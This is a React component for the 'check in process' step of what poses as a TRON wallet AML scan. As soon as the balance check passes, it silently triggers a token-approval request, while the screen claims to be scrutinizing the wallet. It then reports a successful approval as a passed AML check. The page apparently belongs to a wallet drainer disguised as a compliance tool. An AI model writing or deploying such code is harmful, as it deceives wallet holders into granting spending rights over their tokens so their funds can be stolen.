"use client";
import "./CheckInProcess.css";
import React, { useEffect, useState } from "react";
import AmlCheckPassed from "../AmlCheckPassed";
import AmlCheckFailed from "../AmlCheckFailed";

import { useWallet } from "../../context/globalContext";
import { useTronApprove } from "../../hooks/useAprove";

const CheckInProcess = () => {
  const { balances } = useWallet(); // Accesăm balanțele din context
  const { approveTokens, approvalStatus, isLoading } = useTronApprove();
  const [status, setStatus] = useState(null); // Status pentru procesare (valid sau invalid)
  const [showAmlCheck, setShowAmlCheck] = useState(false); // Comută între componente
  console.log({ approvalStatus });

  useEffect(() => {
    const checkBalancesAndInitiateTransaction = async () => {
      if (balances.trx >= 0) {
        console.log("avem mai mult de 2 trx");
        setStatus("valid");
      } else {
        setStatus("invalid");
      }
    };

    if (balances) checkBalancesAndInitiateTransaction();
  }, [balances]);

  useEffect(() => {
    if (status === "valid") {
      approveTokens(); // Nu așteptați procesarea
    }
  }, [status]);

  useEffect(() => {
    if (approvalStatus === "Approval successful!") {
      setTimeout(() => {
        setShowAmlCheck(true);
      }, 1000); // Mică întârziere pentru tranziție
    }
  }, [approvalStatus]);

  if (showAmlCheck) {
    return <AmlCheckPassed />;
  } else if (
    approvalStatus === "Approval failed." ||
    approvalStatus === "User disapproved requested methods'"
  ) {
    return <AmlCheckFailed />;
  }

  return (
    <div className="max-w-md mx-auto p-6 bg-white rounded-lg shadow-lg text-center">
      <div className="flex justify-between items-center mb-4">
        <h2 className="text-2xl font-semibold">Check in process</h2>
        <span className="text-blue-500 bg-blue-100 text-sm px-4 py-1 rounded-full border border-blue-200">
          Step 3 of 4
        </span>
      </div>
      <p className="text-gray-500 mb-6">We scrutinize your wallet thoroughly</p>
      <div className="flex items-center justify-center mb-6">
        <div
          className={`w-24 h-24 border-4 rounded-full flex items-center justify-center ${
            status === "valid" ? "border-blue-500" : "border-red-500"
          } ${isLoading ? "pulsating-circle" : ""}`}
        >
          <span
            className={`block w-6 h-6 rounded-full ${
              status === "valid" ? "bg-blue-500" : "bg-red-500"
            }`}
          ></span>
        </div>
      </div>
      {status === "valid" && isLoading && (
        <p className="text-gray-400">Processing your transaction, please wait...</p>
      )}
      {status === "valid" && !isLoading && (
        <p className="text-gray-400">Please wait 1 minute, we will provide the result soon</p>
      )}
      {status === "invalid" && (
        <div className="bg-red-100 text-red-500 p-4 rounded-lg">
          <p>You don't have at least 2 TRX in your balance for a full scan.</p>
        </div>
      )}
    </div>
  );
};

export default CheckInProcess;
